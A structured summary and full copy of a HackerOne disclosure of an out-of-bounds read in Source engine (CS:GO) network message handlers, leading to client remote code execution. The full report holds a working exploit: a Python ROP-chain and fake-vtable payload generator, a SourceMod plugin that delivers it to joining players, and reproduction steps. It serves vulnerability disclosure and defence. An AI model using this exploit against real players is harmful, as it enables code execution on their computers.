# Out-of-Bounds Reads in Source Engine Network Message Handlers Leading to RCE

## Metadata
- **Source:** HackerOne
- **Report:** 807772 | https://hackerone.com/reports/807772
- **Submitted:** 2020-02-29
- **Reporter:** slidybat
- **Program:** Valve (CS:GO / Source Engine)
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Out-of-Bounds Read, Integer Overflow, Remote Code Execution, Use-After-Free, Improper Input Validation
- **CVEs:** None
- **Category:** memory-binary

## Summary
Multiple network message handlers in Source engine games (particularly CS:GO) perform bounds checking only on the lower limit of entity indices but not the upper limit, allowing out-of-bounds reads. An attacker can exploit integer overflow during array indexing combined with controlled memory via the ShowMenu message to construct a fake object with attacker-controlled vtable and ROP chain, achieving remote code execution.

## Attack scenario
1. Attacker sends a ShowMenu network message from server to client containing UTF16-encoded payload that creates a fake object with vtable and ROP gadgets in global string buffer g_szMenuString at a known offset
2. Attacker calculates an entity index that, when left-shifted by 4 bits, overflows and points to the fake object location in controlled memory
3. Attacker sends GlowPropTurnOff message with the crafted entity index to trigger the vulnerable message handler
4. Handler reads entitylist[index] which now points to attacker's fake object in memory, obtaining a CBaseHandle pointer
5. Handler calls handle->GetBaseEntity() virtual function, which dereferences the fake vtable and jumps to attacker-controlled ROP gadget chain
6. ROP chain executes arbitrary code with game client privileges (e.g., launching calc.exe)

## Root cause
Asymmetric bounds checking: code validates `ent_idx >= 0` but fails to validate upper bounds against maximum entity count. The left-shift operation (shl eax, 4) for array indexing combined with signed integer overflow allows reading arbitrary memory and interpreting it as an object pointer, then dereferencing and calling virtual functions on attacker-controlled data.

## Attacker mindset
An attacker targeting competitive gaming environments or systems running Source engine games would recognize that network messages are untrusted input. The attacker identifies the pattern of incomplete bounds checking across multiple message handlers, realizes the integer overflow opportunity, and leverages a separate ShowMenu message handler weakness to place controlled data at a predictable memory location. This enables a two-stage exploit: first stage sets up fake object infrastructure, second stage triggers arbitrary function call.

## Defensive takeaways
- Implement complete bounds checking for both lower AND upper bounds: if (ent_idx >= 0 && ent_idx < MAX_ENTITIES)
- Use unsigned integers for indices to prevent sign-based overflow exploits
- Avoid interpreting untrusted network data as pointers or object references without validation
- Audit all network message handlers for similar incomplete validation patterns across the codebase
- Implement Address Space Layout Randomization (ASLR) and Control Flow Guard (CFG) to increase ROP exploit difficulty
- Use safe parsing libraries that enforce bounds checking automatically
- Sanitize and validate all user-supplied strings, especially those converted between character encodings
- Implement memory tagging or object validation schemes to prevent fake object exploitation
- Apply principle of least privilege to game client processes to limit post-exploitation impact

## Variant hunting
Search for other network message handlers using similar entitylist[index] access patterns without upper bounds validation
Identify all message handlers that call virtual functions on entity pointers obtained from user input
Review other string buffers similar to g_szMenuString that could be used to place fake objects at predictable locations
Examine other Source engine games (Half-Life 2, Team Fortress 2, Dota 2, etc.) for the same vulnerability pattern
Analyze network protocol handlers for similar integer overflow issues in other array accesses (shift-based indexing)
Look for other message types that allow writing controlled data to memory (not just ShowMenu)
Check for entity list access in client-side prediction or interpolation code that might be exploitable

## MITRE ATT&CK
- T1190
- T1055
- T1021
- T1203
- T1570

## Notes
This is a sophisticated two-stage exploit requiring deep knowledge of Source engine internals, vtable exploitation, ROP gadgets, and game network protocols. The researcher successfully demonstrated RCE by popping calc.exe. The vulnerability affects network message handling at the boundary between trusted game server and untrusted client, making it exploitable in any CS:GO server scenario. The ShowMenu message pre-requisite suggests this attack requires a malicious or compromised server. Similar patterns likely exist across Valve's Source engine portfolio affecting multiple games.

## Full report
<details><summary>Expand</summary>

# Vulnerability
In Source engine games there are many network messages sent from the server to the client that take an entity index. There is a common pattern among many of these messages for the lower bounds of the entity index to be checked but not the upper bounds. In many cases these out of bound reads get an entity pointer from that index then call a virtual function on it.

As an example, here is the handler for the CS:GO [`GlowPropTurnOff`](https://github.com/SteamDatabase/Protobufs/blob/7c7bc10a1ed346a88cc6b9c13d6642578a9ecd50/csgo/cstrike15_usermessages.proto#L444-L446) message:

```cpp
bool _MsgFunc_GlowPropTurnOff(CCSUserMsg_GlowPropTurnOff* msg)
{
  CBaseEntity* entity = nullptr;

  int ent_idx = msg->ent_index;
  if ( ent_idx >= 0 && entitylist[ent_idx] != nullptr )
  {
    CBaseHandle* handle = entitylist[ent_idx]
    entity = handle->GetBaseEntity();  // A virtual function
  }
  
  // ...
  
  return true;
}
```


# Exploiting the vulnerability
I will be discussing the `GlowPropTurnOff` message specifically for the remainder of this report, however this OOB read pattern exists in other messages too. I have successfully tested this on a couple of other CS:GO user messages, and while I haven't tested it I also suspect that this bug pattern exists in the network messages of other Source games as well.

This is the assembly used to access the `entitylist` array:
```asm
mov     eax, ent_idx
test    eax, eax
js      short loc_103B77A2
shl     eax, 4
mov     ecx, entitylist[eax]
```

The index is shifted left by 4 bits (`shl eax, 4`) before being used to access `entitylist`. This means that we can supply a large positive number that will overflow to a negative number, allowing us to return a pointer to pretty much anywhere in the module. Our goal will be to supply an index that returns a pointer to some memory that we control on the client. This memory will have the required vtable set up so that when `handle->GetBaseEntity()` is called it will call an address that we control.

Following a writeup of a similar bug (https://insomnihack.ch/wp-content/uploads/2017/04/AC_remote_exploitation_of_valve_source.pdf), I chose to use the [`ShowMenu`](https://github.com/SteamDatabase/Protobufs/blob/7c7bc10a1ed346a88cc6b9c13d6642578a9ecd50/csgo/cstrike15_usermessages.proto#L417-L421) message to set up the needed memory on the client. The `ShowMenu` message takes the `menu_string` supplied from the server, converts it to UTF16, and stores it in a global string variable `wchar_t g_szMenuString[512]`.

I wrote the following Python script to generate the payload needed to send through the `ShowMenu` message to set up a fake object with a valid vtable and also includes the ROP chain needed to pop calc:
```py
from pwn import *
import textwrap

BASE_ADDRESS        = 0x287E0000
FAKE_OBJ            = BASE_ADDRESS + 0x3174F3C

SHELL_EXECUTE_ADDR  = BASE_ADDRESS + 0xA8F244

GADGET_XCHG_EAX_ESP = BASE_ADDRESS + 0xA2AAD1
GADGET_POP_ESP      = BASE_ADDRESS + 0x7E031C
GADGET_POP_EAX      = BASE_ADDRESS + 0x4a925
GADGET_POP_EDI      = BASE_ADDRESS + 0x2f00C6
GADGET_MOV_EAX_EDI  = BASE_ADDRESS + 0x74215
GADGET_MOV_EAX_EAX  = BASE_ADDRESS + 0x73c92
GADGET_XOR_EAX_EAX  = BASE_ADDRESS + 0xb4279
GADGET_XCHG_EAX_EDI = BASE_ADDRESS + 0x1da80f

def to_unicode(dword):
    a = dword & 0xffff;
    b = dword >> 16;
    return eval('u"\\u%s\\u%s"' % (hex(a)[2:].zfill(4), hex(b)[2:].zfill(4)))

def write(addr, value):
    rop = u''
    rop += to_unicode(GADGET_POP_EAX)
    rop += to_unicode(addr)
    rop += to_unicode(GADGET_POP_EDI)
    rop += to_unicode(value)
    rop += to_unicode(GADGET_MOV_EAX_EDI)
    return rop

def write_deref(addr, to_deref):
    rop = u''
    rop += to_unicode(GADGET_POP_EAX)
    rop += to_unicode(to_deref)
    rop += to_unicode(GADGET_MOV_EAX_EAX)
    rop += to_unicode(GADGET_POP_EDI)
    rop += to_unicode(addr)
    rop += to_unicode(GADGET_XCHG_EAX_EDI)
    rop += to_unicode(GADGET_MOV_EAX_EDI)
    return rop

def write_zero(addr):
    rop = u''
    rop += to_unicode(GADGET_XOR_EAX_EAX)
    rop += to_unicode(GADGET_POP_EDI)
    rop += to_unicode(addr)
    rop += to_unicode(GADGET_XCHG_EAX_EDI)
    rop += to_unicode(GADGET_MOV_EAX_EDI)
    return rop

def stack_pivot(addr):
    rop = u''
    rop += to_unicode(GADGET_POP_ESP)
    rop += to_unicode(addr)
    return rop

rop = ''

open_str_addr = FAKE_OBJ + 400
rop += write(open_str_addr, u32('open'))

calc_str_addr = FAKE_OBJ + 420
rop += write(calc_str_addr, u32('calc'))

# Move stack somewhere where it can safely not overwrite our fake object as functions are called
params_addr = FAKE_OBJ + 1000000
rop += write_deref(params_addr, SHELL_EXECUTE_ADDR)
rop += write(params_addr + 4, 0x41414141)
rop += write_zero(params_addr + 8)
rop += write(params_addr + 12, open_str_addr)
rop += write(params_addr + 16, calc_str_addr)
rop += write_zero(params_addr + 20)
rop += write_zero(params_addr + 24)
rop += write_zero(params_addr + 28)
rop += stack_pivot(params_addr)

# Fake object structure
#  0 - pointer to actual object (#1)
#  1 - pointer to vtable        (#2)
#  2 - pointer to `pop esp`           <-- start of vtable, and where eax will be pointing once #9 is called
#  3 - pointer to full stack    (#10) <-- This will move the stack to somewhere where we have more room 
#  4 - junk
#  5 - junk
#  6 - junk
#  7 - junk
#  8 - junk
#  9 - ptr to `xchg eax, esp`         <-- address that is initially jumped to, will set esp to #2 so we can pivot stack & begin ROP chain
# 10 - stack                          <-- where our ROP chain begins
fakeobj = u''
fakeobj += '--'
fakeobj += to_unicode(FAKE_OBJ + 4)
fakeobj += to_unicode(FAKE_OBJ + 4 * 2)
fakeobj += to_unicode(GADGET_POP_ESP)
fakeobj += to_unicode(FAKE_OBJ + 4 * 10)
fakeobj += u'\u4141\u4141'
fakeobj += u'\u4242\u4242'
fakeobj += u'\u4343\u4343'
fakeobj += u'\u4444\u4444'
fakeobj += u'\u4545\u4545'
fakeobj += to_unicode(GADGET_XCHG_EAX_ESP)
fakeobj += rop

fakeobj = fakeobj.encode('utf-8')

print(''.join(['\\x%02x' % ord(c) for c in fakeobj]))
```

*Note*: As in #470520 the script above needs to know the base address of the client's `client_panorama.dll` module in order to be 100% reliable, however it isn't possible to this due to ASLR.

Next, this payload needs to be sent to the client. I did this using the following SourceMod plugin:
```cpp
#include <sdktools>

public void OnPluginStart()
{
	HookEvent( "player_spawn", Event_PlayerSpawn );
}

public Action Event_PlayerSpawn( Event event, const char[] name, bool dontBroadcast )
{
    int client = GetClientOfUserId( event.GetInt( "userid" ) );
	
	{
		char payload[] = "PLACE PAYLOAD HERE";
	
		Protobuf msg = UserMessageToProtobuf( StartMessageOne( "ShowMenu", client ) );
		msg.SetInt( "bits_valid_slots", 0xFFFFFFFF );
		msg.SetInt( "display_time", 0 );
		msg.SetString( "menu_string", payload );
		EndMessage();
	}
	
	{
		Protobuf msg = UserMessageToProtobuf( StartMessageOne( "GlowPropTurnOff", client ) );
		msg.SetInt( "entidx", 0xfe43167 );
		EndMessage();
	}

	return Plugin_Continue;
}
```

Once a client connects the payload is set up using the `ShowMenu` message and then is triggered immediately after with the `GlowPropTurnOff` message, resulting in calc being popped.


# PoC
Here is a video showcasing the bug being triggered on CS:GO when joining a server:
{F732616}


# Reproduction steps
1) Start CS:GO and note the base address of `client_panorama.dll`
2) Replace the value of `BASE_ADDRESS` in the Python script above with this base address value and run the script
3) Copy the generated payload into the contents of the `payload` string in the SourceMod script above and compile the plugin
4) Add the compiled plugin to the server and connect to this server with the client, as soon as the client is fully connected calc will be popped automatically

## Impact

This bug allows an attacker to execute arbitrary code on the computers of any clients that join their server.

</details>

---
*Analysed by Claude on 2026-05-11*
